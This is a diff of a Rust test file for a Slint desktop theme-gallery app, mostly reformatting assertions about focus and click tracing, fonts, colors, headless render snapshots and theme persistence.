@@ -34,7 +34,10 @@ fn panel_every_mouse_click_leaves_verbose_trace_by_construction() {
         "gallery card-right-clicked idx=",
         "gallery style-selected style=",
     ] {
-        assert!(main.contains(marker), "src/main.rs must trace mouse click: {marker}");
+        assert!(
+            main.contains(marker),
+            "src/main.rs must trace mouse click: {marker}"
+        );
     }
     // Close + Back + Home card + mutating-gated inputs.
     for marker in [
@@ -45,20 +48,38 @@ fn panel_every_mouse_click_leaves_verbose_trace_by_construction() {
         "wheel-step ignored — mutating",
         "mosaic-page-step ignored — mutating",
     ] {
-        assert!(cb.contains(marker), "src/callbacks.rs must trace mouse click: {marker}");
+        assert!(
+            cb.contains(marker),
+            "src/callbacks.rs must trace mouse click: {marker}"
+        );
     }
     // Slint cable plumbing end to end.
     for (path, marker) in [
         ("ui/main.slint", "callback panel-mouse-trace(string)"),
         ("ui/shell.slint", "mutating-guard-click ignored — mutating"),
-        ("ui/panel/PanelRoot.slint", "mouse-trace(reason) => { root.mouse-trace(reason); }"),
+        (
+            "ui/panel/PanelRoot.slint",
+            "mouse-trace(reason) => { root.mouse-trace(reason); }",
+        ),
         ("ui/panel/sections/SaveSection.slint", "save-empty-clicked"),
-        ("ui/panel/sections/SaveSection.slint", "save-dialog-cancelled"),
-        ("ui/panel/sections/SaveSection.slint", "save-open-rename name="),
-        ("ui/panel/sections/SavedThemeCard.slint", "save-card-body idx="),
+        (
+            "ui/panel/sections/SaveSection.slint",
+            "save-dialog-cancelled",
+        ),
+        (
+            "ui/panel/sections/SaveSection.slint",
+            "save-open-rename name=",
+        ),
+        (
+            "ui/panel/sections/SavedThemeCard.slint",
+            "save-card-body idx=",
+        ),
     ] {
         let src = std::fs::read_to_string(path).unwrap_or_else(|_| panic!("{path} must exist"));
-        assert!(src.contains(marker), "{path} must contain mouse trace wiring: {marker}");
+        assert!(
+            src.contains(marker),
+            "{path} must contain mouse trace wiring: {marker}"
+        );
     }
     // Trace-only contract: no mouse-trace handler may touch focus or visuals.
     for path in [
@@ -69,7 +90,10 @@ fn panel_every_mouse_click_leaves_verbose_trace_by_construction() {
         let src = std::fs::read_to_string(path).unwrap_or_else(|_| panic!("{path} must exist"));
         for line in src.lines() {
             if line.contains("mouse-trace(") && !line.trim_start().starts_with("//") {
-                assert!(!line.contains(".focus()"), "mouse trace in {path} must not touch focus: {line}");
+                assert!(
+                    !line.contains(".focus()"),
+                    "mouse trace in {path} must not touch focus: {line}"
+                );
             }
         }
     }
@@ -81,8 +105,8 @@ fn panel_every_mouse_click_leaves_verbose_trace_by_construction() {
 /// check so no competing scope can sneak back in.
 #[test]
 fn panel_deadzone_click_reseeds_focus_by_construction() {
-    let src = std::fs::read_to_string("ui/panel/PanelRoot.slint")
-        .expect("PanelRoot.slint must exist");
+    let src =
+        std::fs::read_to_string("ui/panel/PanelRoot.slint").expect("PanelRoot.slint must exist");
     // Single-FocusScope architecture (HVE 1 pattern): panel-kbd owns ALL
     // keyboard input for the panel; sections own no FocusScope.
     assert!(
@@ -224,9 +248,9 @@ fn reseed_marks_a_user_border_card_from_a_legacy_bare_stem() {
         SharedString::from("03_duo.lua"),
         SharedString::from("14_looper.lua"),
     ])));
-    win.set_user_border_preset_names(ModelRc::new(VecModel::from(vec![
-        SharedString::from("Space"),
-    ])));
+    win.set_user_border_preset_names(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "Space",
+    )])));
 
     win.set_active_border_index(-1);
     assert_eq!(
@@ -436,13 +460,25 @@ fn reseed_marks_a_user_animation_card_from_a_bare_stem() {
 fn panel_every_focus_move_leaves_verbose_trace_by_construction() {
     let main = std::fs::read_to_string("src/main.rs").expect("src/main.rs must exist");
     let cb = std::fs::read_to_string("src/callbacks.rs").expect("src/callbacks.rs must exist");
-    assert!(main.contains("on_panel_focus_trace"), "src/main.rs must handle panel focus trace");
-    assert!(cb.contains("focus_trace"), "src/callbacks.rs must format focus trace");
-    assert!(cb.contains("[focus]"), "focus trace must use the [focus] tag");
+    assert!(
+        main.contains("on_panel_focus_trace"),
+        "src/main.rs must handle panel focus trace"
+    );
+    assert!(
+        cb.contains("focus_trace"),
+        "src/callbacks.rs must format focus trace"
+    );
+    assert!(
+        cb.contains("[focus]"),
+        "focus trace must use the [focus] tag"
+    );
     // Slint cable plumbing end to end.
     for (path, marker) in [
         ("ui/main.slint", "callback panel-focus-trace(string)"),
-        ("ui/main.slint", "panel-focus-trace(reason) => { root.panel-focus-trace(reason); }"),
+        (
+            "ui/main.slint",
+            "panel-focus-trace(reason) => { root.panel-focus-trace(reason); }",
+        ),
         ("ui/shell.slint", "callback panel-focus-trace(string)"),
         (
             "ui/shell.slint",
@@ -453,16 +489,29 @@ fn panel_every_focus_move_leaves_verbose_trace_by_construction() {
         ("ui/panel/PanelRoot.slint", "panel-kbd lost"),
     ] {
         let src = std::fs::read_to_string(path).unwrap_or_else(|_| panic!("{path} must exist"));
-        assert!(src.contains(marker), "{path} must contain focus trace wiring: {marker}");
+        assert!(
+            src.contains(marker),
+            "{path} must contain focus trace wiring: {marker}"
+        );
     }
     // Each traced scope reports gain + loss with scope + direction.
     for (path, gained, lost) in [
-        ("ui/panel/PanelRoot.slint", "panel-kbd gained", "panel-kbd lost"),
+        (
+            "ui/panel/PanelRoot.slint",
+            "panel-kbd gained",
+            "panel-kbd lost",
+        ),
         ("ui/shell.slint", "shell-kbd gained", "shell-kbd lost"),
     ] {
         let src = std::fs::read_to_string(path).unwrap_or_else(|_| panic!("{path} must exist"));
-        assert!(src.contains("focus-gained(reason)"), "{path} must trace focus gain");
-        assert!(src.contains("focus-lost(reason)"), "{path} must trace focus loss");
+        assert!(
+            src.contains("focus-gained(reason)"),
+            "{path} must trace focus gain"
+        );
+        assert!(
+            src.contains("focus-lost(reason)"),
+            "{path} must trace focus loss"
+        );
         assert!(src.contains(gained), "{path} must report `{gained}`");
         assert!(src.contains(lost), "{path} must report `{lost}`");
         // All five FocusReason variants mapped explicitly (Slint exposes
@@ -478,14 +527,14 @@ fn panel_every_focus_move_leaves_verbose_trace_by_construction() {
         }
     }
     // Trace-only contract: no focus-trace handler may touch focus or visuals.
-    for path in [
-        "ui/panel/PanelRoot.slint",
-        "ui/shell.slint",
-    ] {
+    for path in ["ui/panel/PanelRoot.slint", "ui/shell.slint"] {
         let src = std::fs::read_to_string(path).unwrap_or_else(|_| panic!("{path} must exist"));
         for line in src.lines() {
             if line.contains("focus-trace(") && !line.trim_start().starts_with("//") {
-                assert!(!line.contains(".focus()"), "focus trace in {path} must not touch focus: {line}");
+                assert!(
+                    !line.contains(".focus()"),
+                    "focus trace in {path} must not touch focus: {line}"
+                );
                 assert!(
                     !line.contains("focus-gen"),
                     "focus trace in {path} must not bump focus-gen: {line}"
@@ -564,7 +613,10 @@ fn vendored_fonts_are_complete_and_imported() {
     for name in fonts {
         let path = format!("assets/fonts/{name}");
         let bytes = std::fs::read(&path).unwrap_or_else(|_| panic!("{path} must exist"));
-        assert!(bytes.len() >= 10_000, "{path} must be a complete font, not a stub");
+        assert!(
+            bytes.len() >= 10_000,
+            "{path} must be a complete font, not a stub"
+        );
         // TrueType files start with the 0x0001_0000 magic; anything else means
         // the file was truncated, re-encoded or is not the vendored font.
         assert_eq!(
@@ -609,7 +661,10 @@ fn vendored_fonts_are_complete_and_imported() {
 
     // Both licences travel with the fonts: Roboto + Roboto Condensed share one
     // file, Roboto Mono has its own.
-    for name in ["assets/fonts/OFL-Roboto.txt", "assets/fonts/OFL-RobotoMono.txt"] {
+    for name in [
+        "assets/fonts/OFL-Roboto.txt",
+        "assets/fonts/OFL-RobotoMono.txt",
+    ] {
         let text = std::fs::read_to_string(name).unwrap_or_else(|_| panic!("{name} must exist"));
         assert!(
             text.contains("SIL Open Font License"),
@@ -826,12 +881,24 @@ fn tokens_borders_opacity_and_colors_match_design() {
 
     // Colors (skwd palette → HveColors mapping, design.md).
     assert_eq!(t.get_primary(), slint::Color::from_rgb_u8(0xff, 0xb4, 0xab));
-    assert_eq!(t.get_tertiary(), slint::Color::from_rgb_u8(0x8b, 0xce, 0xff));
+    assert_eq!(
+        t.get_tertiary(),
+        slint::Color::from_rgb_u8(0x8b, 0xce, 0xff)
+    );
     assert_eq!(t.get_surface(), slint::Color::from_rgb_u8(0x1d, 0x10, 0x0e));
-    assert_eq!(t.get_surface_variant(), slint::Color::from_rgb_u8(0x5a, 0x41, 0x3e));
-    assert_eq!(t.get_surface_container(), slint::Color::from_rgb_u8(0x2c, 0x1f, 0x1d));
+    assert_eq!(
+        t.get_surface_variant(),
+        slint::Color::from_rgb_u8(0x5a, 0x41, 0x3e)
+    );
+    assert_eq!(
+        t.get_surface_container(),
+        slint::Color::from_rgb_u8(0x2c, 0x1f, 0x1d)
+    );
     assert_eq!(t.get_outline(), slint::Color::from_rgb_u8(0xa9, 0x89, 0x86));
-    assert_eq!(t.get_fallback_accent(), slint::Color::from_rgb_u8(0x4f, 0xc3, 0xf7));
+    assert_eq!(
+        t.get_fallback_accent(),
+        slint::Color::from_rgb_u8(0x4f, 0xc3, 0xf7)
+    );
 }
 
 #[test]
@@ -882,7 +949,11 @@ fn main_window_mounts_shell_with_initial_state() {
     // Rust NavState and holds no navigation state of its own.
     assert_eq!(win.get_mounted_screen(), 0, "Home — nothing mounted");
     assert!(!win.get_expanded(), "Collapsed at startup");
-    assert_eq!(win.get_focused_card(), 0, "focus starts on card 0 (Gallery)");
+    assert_eq!(
+        win.get_focused_card(),
+        0,
+        "focus starts on card 0 (Gallery)"
+    );
 }
 
 #[test]
@@ -1032,9 +1103,17 @@ fn main_window_exposes_navigation_callbacks() {
     win.invoke_nav_move(slint::SharedString::from("down"));
     win.invoke_nav_move(slint::SharedString::from("up"));
 
-    assert_eq!(*activated.borrow(), vec![0, 1], "card-activated fires with the focused card index");
+    assert_eq!(
+        *activated.borrow(),
+        vec![0, 1],
+        "card-activated fires with the focused card index"
+    );
     assert_eq!(*backs.borrow(), 1, "back-activated fires on back/collapse");
-    assert_eq!(*moves.borrow(), vec!["down", "up"], "nav-move reports arrow direction");
+    assert_eq!(
+        *moves.borrow(),
+        vec!["down", "up"],
+        "nav-move reports arrow direction"
+    );
 }
 
 #[test]
@@ -1062,7 +1141,11 @@ fn panel_keyboard_nav_callbacks_exposed() {
     win.invoke_panel_save_focus_requested(2);
 
     assert_eq!(*navs.borrow(), vec![1, -1], "save-nav reports arrow deltas");
-    assert_eq!(*focuses.borrow(), vec![2], "click focus converges on the row index");
+    assert_eq!(
+        *focuses.borrow(),
+        vec![2],
+        "click focus converges on the row index"
+    );
 }
 
 // ── V6 focus-flow visual verification (headless render) ────────────────
@@ -1160,9 +1243,16 @@ fn render_snapshot_is_written_into_the_per_run_directory() {
     std::fs::create_dir_all("/tmp/opencode").expect("scratch dir");
     let stale = b"stale frame left by an earlier run";
     std::fs::write(&flat, stale).expect("seed a stale frame at the shared path");
-    save_slice_png(slint::SharedPixelBuffer::<slint::Rgba8Pixel>::new(4, 4), name);
+    save_slice_png(
+        slint::SharedPixelBuffer::<slint::Rgba8Pixel>::new(4, 4),
+        name,
+    );
     let written = render_run_dir().join(name);
-    assert!(written.is_file(), "snapshot must land in the run dir: {}", written.display());
+    assert!(
+        written.is_file(),
+        "snapshot must land in the run dir: {}",
+        written.display()
+    );
     assert_eq!(
         std::fs::read(&flat).expect("read the seeded frame"),
         stale,
@@ -1188,23 +1278,25 @@ fn render_run_dir_identity_is_per_run_and_env_overridable() {
         render_run_dir_from(Some("/tmp/opencode/custom-run"), 1, 1),
         PathBuf::from("/tmp/opencode/custom-run")
     );
-    assert_eq!(render_run_dir_from(Some("  "), 1, 1), render_run_dir_from(None, 1, 1), "a blank override must fall back");
+    assert_eq!(
+        render_run_dir_from(Some("  "), 1, 1),
+        render_run_dir_from(None, 1, 1),
+        "a blank override must fall back"
+    );
 }
 
 #[test]
 fn slice_focus_flow_renders_settled_and_midflight() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
     // Software-rasterized headless backend (first init on this thread).
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -1254,16 +1346,17 @@ fn slice_focus_flow_renders_settled_and_midflight() {
     }
     win.set_gallery_cards(ModelRc::new(VecModel::from(cards)));
 
-    let tiles: Vec<crate::SliceTileData> = crate::shell::gallery::views::slice::slice_delta_tiles(count, 6, stage_w)
-        .into_iter()
-        .map(|t| crate::SliceTileData {
-            delta: t.delta,
-            real_index: t.real_index as i32,
-            is_expanded: t.is_expanded,
-            fade: t.fade,
-            dist: t.dist,
-        })
-        .collect();
+    let tiles: Vec<crate::SliceTileData> =
+        crate::shell::gallery::views::slice::slice_delta_tiles(count, 6, stage_w)
+            .into_iter()
+            .map(|t| crate::SliceTileData {
+                delta: t.delta,
+                real_index: t.real_index as i32,
+                is_expanded: t.is_expanded,
+                fade: t.fade,
+                dist: t.dist,
+            })
+            .collect();
     win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(tiles)));
 
     // Settled: focus position exactly at the focused index (frac 0). The
@@ -1351,7 +1444,9 @@ fn slice_focus_flow_renders_settled_and_midflight() {
     );
     // The keeper left the slider on real 2 before hiding: focused index,
     // delta-base, focus-pos and the tile labels all sit there.
-    win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(late_slice_tiles(count, 2, stage_w))));
+    win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(late_slice_tiles(
+        count, 2, stage_w,
+    ))));
     win.set_gallery_focused(2);
     win.set_gallery_slice_delta_base(2);
     win.set_gallery_slice_focus_pos(2.0);
@@ -1391,7 +1486,10 @@ fn slice_focus_flow_renders_settled_and_midflight() {
     // Hidden, then shown: one real transition.
     controller.set_window_hidden(true);
     let _ = controller.show_window(&win);
-    assert!(!controller.window_hidden(), "the show must clear the hidden state");
+    assert!(
+        !controller.window_hidden(),
+        "the show must clear the hidden state"
+    );
 
     assert_eq!(
         win.get_gallery_focused(),
@@ -1436,7 +1534,10 @@ fn slice_focus_flow_renders_settled_and_midflight() {
 
     // The ring visibly moved: the central band differs from the stale frame.
     let recentered = win.window().take_snapshot().expect("recentered snapshot");
-    save_slice_png(recentered.clone(), "slice_recentered_on_active_after_show.png");
+    save_slice_png(
+        recentered.clone(),
+        "slice_recentered_on_active_after_show.png",
+    );
     let moved = frame_diff(&stale, &recentered, (400, 212, 1520, 732));
     assert!(
         moved > 1000,
@@ -1500,7 +1601,9 @@ fn ctrl_drawer_deploy_renders() {
             .map(|i| late_card(&format!("Theme {i}"), i == focused))
             .collect::<Vec<_>>(),
     )));
-    win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(late_slice_tiles(count, focused, 1920.0))));
+    win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(late_slice_tiles(
+        count, focused, 1920.0,
+    ))));
     win.set_gallery_slice_delta_base(focused as i32);
     win.set_gallery_slice_focus_pos(focused as f32);
 
@@ -1523,7 +1626,10 @@ fn ctrl_drawer_deploy_renders() {
         win.get_gallery_bottom_open(),
         "Ctrl+Down must deploy the bottom drawer before the snapshot"
     );
-    let bottom = win.window().take_snapshot().expect("bottom drawer snapshot");
+    let bottom = win
+        .window()
+        .take_snapshot()
+        .expect("bottom drawer snapshot");
     save_slice_png(bottom, "ctrl_bottom_drawer_slider.png");
     win.set_gallery_bottom_open(false);
     focus_settle();
@@ -1537,7 +1643,10 @@ fn ctrl_drawer_deploy_renders() {
         win.get_gallery_top_open(),
         "Ctrl+Up must deploy the top drawer in the Mosaic before the snapshot"
     );
-    let mosaic = win.window().take_snapshot().expect("mosaic top drawer snapshot");
+    let mosaic = win
+        .window()
+        .take_snapshot()
+        .expect("mosaic top drawer snapshot");
     save_slice_png(mosaic, "ctrl_top_drawer_mosaic.png");
 
     // The five pill words are panel chrome: deploying the SAME drawer again
@@ -1745,7 +1854,9 @@ fn theme_info_panel_renders_closed_and_open() {
     save_slice_png(sliding.clone(), "theme_info_sliding.png");
     let t0_diff = {
         let (sb, cb) = (sliding.as_bytes(), closed.as_bytes());
-        (0..sb.len().min(cb.len())).filter(|&i| sb[i] != cb[i]).count()
+        (0..sb.len().min(cb.len()))
+            .filter(|&i| sb[i] != cb[i])
+            .count()
     };
     assert_eq!(
         t0_diff, 0,
@@ -1798,10 +1909,8 @@ fn theme_info_panel_renders_closed_and_open() {
             // A 2px band belongs to the card: the face is flush with the card's
             // own slanted edge, so its border lands ON that edge and a sample
             // grid can straddle it. A real leak is far wider than that.
-            let inside = (x as f32) >= left - 2.0
-                && (x as f32) <= right + 2.0
-                && t >= -0.01
-                && t <= 1.01;
+            let inside =
+                (x as f32) >= left - 2.0 && (x as f32) <= right + 2.0 && t >= -0.01 && t <= 1.01;
             if inside {
                 if delta > 40 {
                     big_inside += 1;
@@ -1863,7 +1972,9 @@ fn theme_info_face_never_shows_on_another_card() {
         name: SharedString::from("BordesRedondosCentrados"),
         saved_at: SharedString::from("2026-10-03T10:00:00Z"),
         providers: ModelRc::new(VecModel::from(vec![SharedString::from("hve-presets")])),
-        swatches: ModelRc::new(VecModel::from(vec![slint::Color::from_rgb_u8(0x2e, 0xc4, 0x36)])),
+        swatches: ModelRc::new(VecModel::from(vec![slint::Color::from_rgb_u8(
+            0x2e, 0xc4, 0x36,
+        )])),
         rows: ModelRc::new(VecModel::from(vec![crate::ThemeInfoRow {
             label: SharedString::from("Animation"),
             value: SharedString::from("12 rebote"),
@@ -1995,8 +2106,12 @@ fn mosaic_grown_tile_covers_only_its_own_card() {
     let stage_h = 1080.0f32;
     let pg = crate::shell::gallery::views::mosaic::MosaicPages::new(count, stage_w, stage_h);
     let (aspects, real_indices) = pg.page_render();
-    let (layout, tile_reals) =
-        crate::shell::gallery::views::mosaic::justified_hero_layout(&aspects, &real_indices, stage_w, stage_h);
+    let (layout, tile_reals) = crate::shell::gallery::views::mosaic::justified_hero_layout(
+        &aspects,
+        &real_indices,
+        stage_w,
+        stage_h,
+    );
     let delays = crate::shell::gallery::views::mosaic::mosaic_curtain_delays(&layout.tiles);
     let tiles: Vec<crate::MosaicTileData> = layout
         .tiles
@@ -2025,7 +2140,9 @@ fn mosaic_grown_tile_covers_only_its_own_card() {
         name: SharedString::from("BordesRedondosCentrados"),
         saved_at: SharedString::from("2026-10-03T10:00:00Z"),
         providers: ModelRc::new(VecModel::from(vec![SharedString::from("hve-presets")])),
-        swatches: ModelRc::new(VecModel::from(vec![slint::Color::from_rgb_u8(0x2e, 0xc4, 0x36)])),
+        swatches: ModelRc::new(VecModel::from(vec![slint::Color::from_rgb_u8(
+            0x2e, 0xc4, 0x36,
+        )])),
         rows: ModelRc::new(VecModel::from(vec![crate::ThemeInfoRow {
             label: SharedString::from("Animation"),
             value: SharedString::from("12 rebote"),
@@ -2150,8 +2267,12 @@ fn mosaic_first_click_grows_and_the_second_applies() {
     let stage_h = 1080.0f32;
     let pg = crate::shell::gallery::views::mosaic::MosaicPages::new(count, stage_w, stage_h);
     let (aspects, real_indices) = pg.page_render();
-    let (layout, tile_reals) =
-        crate::shell::gallery::views::mosaic::justified_hero_layout(&aspects, &real_indices, stage_w, stage_h);
+    let (layout, tile_reals) = crate::shell::gallery::views::mosaic::justified_hero_layout(
+        &aspects,
+        &real_indices,
+        stage_w,
+        stage_h,
+    );
     let delays = crate::shell::gallery::views::mosaic::mosaic_curtain_delays(&layout.tiles);
     let tiles: Vec<crate::MosaicTileData> = layout
         .tiles
@@ -2274,7 +2395,10 @@ fn gallery_opens_on_active_theme() {
 
     // Opening the slider focuses the active theme — not index 0.
     let initial = crate::gallery_initial_focus(&win);
-    assert_eq!(initial, active, "initial carousel focus must be the active theme");
+    assert_eq!(
+        initial, active,
+        "initial carousel focus must be the active theme"
+    );
     win.set_gallery_focused(initial as i32);
 
     // Settle exactly like production refresh_slice_ring: relabel deltas for
@@ -2292,8 +2416,14 @@ fn gallery_opens_on_active_theme() {
             })
             .collect();
     // The expanded (center, focused) tile must be the active card.
-    let expanded = tiles.iter().find(|t| t.is_expanded).expect("one expanded tile");
-    assert_eq!(expanded.real_index as usize, active, "expanded tile must be the active theme");
+    let expanded = tiles
+        .iter()
+        .find(|t| t.is_expanded)
+        .expect("one expanded tile");
+    assert_eq!(
+        expanded.real_index as usize, active,
+        "expanded tile must be the active theme"
+    );
     win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(tiles)));
     win.set_gallery_slice_delta_base(initial as i32);
     win.set_gallery_slice_focus_pos(initial as f32);
@@ -2307,14 +2437,21 @@ fn gallery_opens_on_active_theme() {
 
     // Fallback: no active theme → focus 0 (previous behavior preserved).
     let model = win.get_gallery_cards();
-    if let Some(vm) = model.as_any().downcast_ref::<VecModel<crate::GalleryCardData>>() {
+    if let Some(vm) = model
+        .as_any()
+        .downcast_ref::<VecModel<crate::GalleryCardData>>()
+    {
         for i in 0..vm.row_count() {
             let mut row = vm.row_data(i).unwrap();
             row.is_active = false;
             vm.set_row_data(i, row);
         }
     }
-    assert_eq!(crate::gallery_initial_focus(&win), 0, "no active theme → focus 0");
+    assert_eq!(
+        crate::gallery_initial_focus(&win),
+        0,
+        "no active theme → focus 0"
+    );
 }
 
 // ── Late-active re-affirm (real-startup reproduction) ───────────────────
@@ -2390,10 +2527,16 @@ fn gallery_fallback_focus_reaffirms_when_active_arrives_late() {
     // Real startup: no active mark anywhere (empty last_applied on disk).
     let names = ["Alpha", "Beta", "Gamma", "Delta"];
     win.set_gallery_cards(ModelRc::new(VecModel::from(
-        names.iter().map(|n| late_card(n, false)).collect::<Vec<_>>(),
+        names
+            .iter()
+            .map(|n| late_card(n, false))
+            .collect::<Vec<_>>(),
     )));
     let initial = crate::gallery_initial_focus(&win);
-    assert_eq!(initial, 0, "no resolved active → fallback focus 0 (real startup)");
+    assert_eq!(
+        initial, 0,
+        "no resolved active → fallback focus 0 (real startup)"
+    );
     win.set_gallery_focused(initial as i32);
     crate::gallery_note_startup(&win);
     // Settle exactly like production refresh_slice_ring (zero drift).
@@ -2421,14 +2564,22 @@ fn gallery_fallback_focus_reaffirms_when_active_arrives_late() {
             .map(|n| late_card(n, *n == "Gamma"))
             .collect::<Vec<_>>(),
     );
-    assert_eq!(crate::gallery_initial_focus(&win), 2, "late active resolves at index 2");
+    assert_eq!(
+        crate::gallery_initial_focus(&win),
+        2,
+        "late active resolves at index 2"
+    );
 
     // Re-affirm snaps focus onto the late active card (caller refreshes ring).
     assert!(
         crate::reaffirm_gallery_focus_on_active(&win),
         "fallback startup + late active → must snap"
     );
-    assert_eq!(win.get_gallery_focused(), 2, "focus must move to the late active card");
+    assert_eq!(
+        win.get_gallery_focused(),
+        2,
+        "focus must move to the late active card"
+    );
     win.set_gallery_slice_tiles(ModelRc::new(VecModel::from(late_slice_tiles(
         names.len(),
         2,
@@ -2483,7 +2634,10 @@ fn gallery_reaffirm_never_yanks_user_navigation() {
 
     let names = ["Alpha", "Beta", "Gamma", "Delta"];
     win.set_gallery_cards(ModelRc::new(VecModel::from(
-        names.iter().map(|n| late_card(n, false)).collect::<Vec<_>>(),
+        names
+            .iter()
+            .map(|n| late_card(n, false))
+            .collect::<Vec<_>>(),
     )));
     win.set_gallery_focused(crate::gallery_initial_focus(&win) as i32);
     crate::gallery_note_startup(&win);
@@ -2534,7 +2688,10 @@ fn gallery_reaffirm_idle_when_startup_had_active() {
     // re-affirm stays idle forever.
     let names = ["Alpha", "Beta", "Gamma", "Delta"];
     win.set_gallery_cards(ModelRc::new(VecModel::from(
-        names.iter().map(|n| late_card(n, *n == "Beta")).collect::<Vec<_>>(),
+        names
+            .iter()
+            .map(|n| late_card(n, *n == "Beta"))
+            .collect::<Vec<_>>(),
     )));
     let initial = crate::gallery_initial_focus(&win);
     assert_eq!(initial, 1);
@@ -2554,7 +2711,11 @@ fn mark_theme_applied_persists_active_across_restart() {
     // Sandboxed HOME so no real user config is touched.
     let _env = crate::test_utils::TempEnv::new();
     let config_dir = dirs::config_dir()
-        .or_else(|| std::env::var("HOME").ok().map(|h: String| std::path::PathBuf::from(h).join(".config")))
+        .or_else(|| {
+            std::env::var("HOME")
+                .ok()
+                .map(|h: String| std::path::PathBuf::from(h).join(".config"))
+        })
         .expect("sandboxed config dir");
     for name in ["Alpha", "Beta", "Gamma"] {
         let dir = config_dir.join("hve").join("themes").join(name);
@@ -2577,8 +2738,7 @@ fn mark_theme_applied_persists_active_across_restart() {
 
     let proj = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
     let engine = crate::engine::Engine::new(&proj);
-    let mut state =
-        crate::app_state::AppState::new(crate::config::Config::load(), engine, tm);
+    let mut state = crate::app_state::AppState::new(crate::config::Config::load(), engine, tm);
     state.mark_theme_applied("Beta");
     assert_eq!(state.theme_manager().last_applied, "Beta");
     assert_eq!(state.cfg().last_applied_theme, "Beta");
@@ -2586,11 +2746,17 @@ fn mark_theme_applied_persists_active_across_restart() {
 
     // Next process: cfg reload seeds the manager → Beta resolves active.
     let reloaded = crate::config::Config::load();
-    assert_eq!(reloaded.last_applied_theme, "Beta", "active must survive restart");
+    assert_eq!(
+        reloaded.last_applied_theme, "Beta",
+        "active must survive restart"
+    );
     let mut tm2 = crate::theme_manager::ThemeManager::new(&config_dir);
     tm2.last_applied = reloaded.last_applied_theme.clone();
     let infos = tm2.list().unwrap_or_default();
-    let beta = infos.iter().find(|t| t.name == "Beta").expect("Beta listed");
+    let beta = infos
+        .iter()
+        .find(|t| t.name == "Beta")
+        .expect("Beta listed");
     assert!(beta.is_active, "Beta must resolve active after restart");
     assert_eq!(infos.iter().filter(|t| t.is_active).count(), 1);
 }
@@ -2602,16 +2768,14 @@ fn mark_theme_applied_persists_active_across_restart() {
 #[test]
 fn save_dialogs_render_list_delete_and_rename() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
 
     let win = crate::MainWindow::new().unwrap();
@@ -2653,8 +2817,14 @@ fn save_dialogs_render_list_delete_and_rename() {
 
     let diff_list_delete = count_buffer_diff(&list, &delete);
     let diff_list_rename = count_buffer_diff(&list, &rename);
-    assert!(diff_list_delete > 300, "delete dialog must overlay the list — got {diff_list_delete}");
-    assert!(diff_list_rename > 300, "rename dialog must overlay the list — got {diff_list_rename}");
+    assert!(
+        diff_list_delete > 300,
+        "delete dialog must overlay the list — got {diff_list_delete}"
+    );
+    assert!(
+        diff_list_rename > 300,
+        "rename dialog must overlay the list — got {diff_list_rename}"
+    );
 }
 
 // ── Preset rename/delete dialogs (Borders + Motion) ─────────────────────
@@ -2738,16 +2908,14 @@ fn preset_rename_delete_use_shared_dialogs() {
 #[test]
 fn preset_dialogs_render_rename_and_delete() {
     use slint::{ComponentHandle as _, ModelRc, SharedString, VecModel};
-    i_slint_core::platform::set_platform(Box::new(
-        i_slint_backend_testing::TestingBackend::new(
-            i_slint_backend_testing::TestingBackendOptions {
-                mock_time: true,
-                threading: false,
-                renderer_name: Some(slint::SharedString::from("software")),
-                ..Default::default()
-            },
-        ),
-    ))
+    i_slint_core::platform::set_platform(Box::new(i_slint_backend_testing::TestingBackend::new(
+        i_slint_backend_testing::TestingBackendOptions {
+            mock_time: true,
+            threading: false,
+            renderer_name: Some(slint::SharedString::from("software")),
+            ..Default::default()
+        },
+    )))
     .expect("platform already initialized");
     let win = crate::MainWindow::new().unwrap();
     win.window().set_size(slint::PhysicalSize::new(1920, 1080));
@@ -2776,14 +2944,20 @@ fn preset_dialogs_render_rename_and_delete() {
     for _ in 0..4 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let border_rename = win.window().take_snapshot().expect("border rename snapshot");
+    let border_rename = win
+        .window()
+        .take_snapshot()
+        .expect("border rename snapshot");
     save_slice_png(border_rename.clone(), "preset_border_rename.png");
 
     win.set_border_dialog_mode(SharedString::from("delete"));
     for _ in 0..4 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let border_delete = win.window().take_snapshot().expect("border delete snapshot");
+    let border_delete = win
+        .window()
+        .take_snapshot()
+        .expect("border delete snapshot");
     save_slice_png(border_delete.clone(), "preset_border_delete.png");
 
     assert!(
@@ -2815,7 +2989,10 @@ fn preset_dialogs_render_rename_and_delete() {
     for _ in 0..4 {
         i_slint_backend_testing::mock_elapsed_time(std::time::Duration::from_millis(16));
     }
-    let motion_rename = win.window().take_snapshot().expect("motion rename snapshot");
+    let motion_rename = win
+        .window()
+        .take_snapshot()
+        .expect("motion rename snapshot");
     save_slice_png(motion_rename.clone(), "preset_motion_rename.png");
     assert!(
         count_buffer_diff(&motion_list, &motion_rename) > 300,
@@ -2831,16 +3008,14 @@ fn preset_dialogs_render_rename_and_delete() {
 #[test]
